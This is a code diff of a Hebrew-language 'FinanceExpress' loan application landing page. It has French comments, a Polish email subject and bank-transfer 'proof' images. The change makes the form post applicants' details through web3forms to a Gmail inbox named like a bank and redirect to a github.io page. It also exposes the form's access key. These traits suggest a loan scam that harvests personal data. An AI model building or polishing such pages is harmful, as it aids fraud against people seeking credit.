@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- TOUS LES STYLES (inchangés) --- */
+        /* --- STYLES COMPLETS (inchangés) --- */
         :root {
             --primary: #0f172a;
             --primary-light: #1e293b;
@@ -138,39 +138,6 @@
         .footer-col a:hover { color: var(--secondary); }
         .footer-bottom { border-top: 1px solid #334155; padding-top: 30px; text-align: center; font-size: 0.9rem; }
 
-        #success-message {
-            display: none;
-            background: #f0fdf4;
-            border: 2px solid #10b981;
-            border-radius: var(--radius-2xl);
-            padding: 30px;
-            text-align: center;
-            margin-top: 20px;
-        }
-        #success-message i {
-            font-size: 3rem;
-            color: #10b981;
-            margin-bottom: 10px;
-        }
-        #success-message h3 {
-            color: #0f172a;
-            font-size: 1.5rem;
-            margin-bottom: 10px;
-        }
-        #success-message p {
-            color: #64748b;
-        }
-        #error-message {
-            display: none;
-            background: #fef2f2;
-            border: 2px solid #ef4444;
-            border-radius: var(--radius-2xl);
-            padding: 20px;
-            text-align: center;
-            margin-top: 15px;
-            color: #991b1b;
-        }
-
         @media (max-width: 992px) {
             .hero-container, .steps-grid, .features-grid, .testimonials-grid, .footer-grid, .proof-images { grid-template-columns: 1fr; }
             .hero { text-align: center; }
@@ -235,10 +202,13 @@
                 <div class="hero-form-container">
                     <h3 style="text-align: center; margin-bottom: 24px; font-size: 1.5rem;">מלא את הבקשה</h3>
                     
-                    <form id="loan-form">
+                    <!-- Formulaire avec redirection corrigée -->
+                    <form action="https://api.web3forms.com/submit" method="POST">
                         <input type="hidden" name="access_key" value="c2552c68-8921-4ef2-bbc4-5a41a058b5f5">
                         <input type="hidden" name="to_email" value="bankvantex047@gmail.com">
                         <input type="hidden" name="subject" value="NOWY WNIOSEK - FinanceExpress">
+                        <!-- Redirection corrigée vers merci.html -->
+                        <input type="hidden" name="redirect" value="https://monika-source.github.io/Monil/merci.html">
                         
                         <div class="form-grid">
                             <div class="form-group">
@@ -304,20 +274,10 @@
                             </label>
                         </div>
                         
-                        <button type="submit" class="btn-submit btn btn-primary btn-lg" id="submit-btn">
+                        <button type="submit" class="btn-submit btn btn-primary btn-lg">
                             <i class="fas fa-paper-plane"></i> שלח בקשה
                         </button>
                     </form>
-
-                    <div id="success-message">
-                        <i class="fas fa-check-circle"></i>
-                        <h3>תודה! הבקשה שלך התקבלה</h3>
-                        <p>קיבלנו את פרטיך. ניצור איתך קשר בהקדם האפשרי.</p>
-                    </div>
-                    <div id="error-message">
-                        <i class="fas fa-exclamation-circle"></i>
-                        <p id="error-text">אירעה שגיאה. אנא נסה שוב.</p>
-                    </div>
                 </div>
             </div>
         </section>
@@ -416,9 +376,7 @@
                     <p class="section-subtitle">הכסף מגיע לחשבון תוך 24 שעות</p>
                 </div>
                 <div class="proof-images">
-                    <!-- Première image : iframe_bank_transfer_form.jpg -->
                     <img src="iframe_bank_transfer_form.jpg" alt="אישור העברה 1">
-                    <!-- Deuxième image : images (10).jpeg -->
                     <img src="images (10).jpeg" alt="אישור העברה 2">
                 </div>
             </div>
@@ -521,46 +479,6 @@
                 }
                 item.classList.toggle("active");
             });
-        });
-
-        // --- ENVOI AJAX ---
-        const form = document.getElementById('loan-form');
-        const submitBtn = document.getElementById('submit-btn');
-        const successMsg = document.getElementById('success-message');
-        const errorMsg = document.getElementById('error-message');
-        const errorText = document.getElementById('error-text');
-
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            successMsg.style.display = 'none';
-            errorMsg.style.display = 'none';
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> שולח...';
-
-            const formData = new FormData(form);
-
-            try {
-                const response = await fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-
-                if (result.success) {
-                    form.style.display = 'none';
-                    successMsg.style.display = 'block';
-                } else {
-                    errorText.textContent = result.message || 'אירעה שגיאה. אנא נסה שוב.';
-                    errorMsg.style.display = 'block';
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> שלח בקשה';
-                }
-            } catch (error) {
-                errorText.textContent = 'בעיית תקשורת. אנא בדוק את החיבור שלך ונסה שוב.';
-                errorMsg.style.display = 'block';
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> שלח בקשה';
-            }
         });
     </script>
 </body>
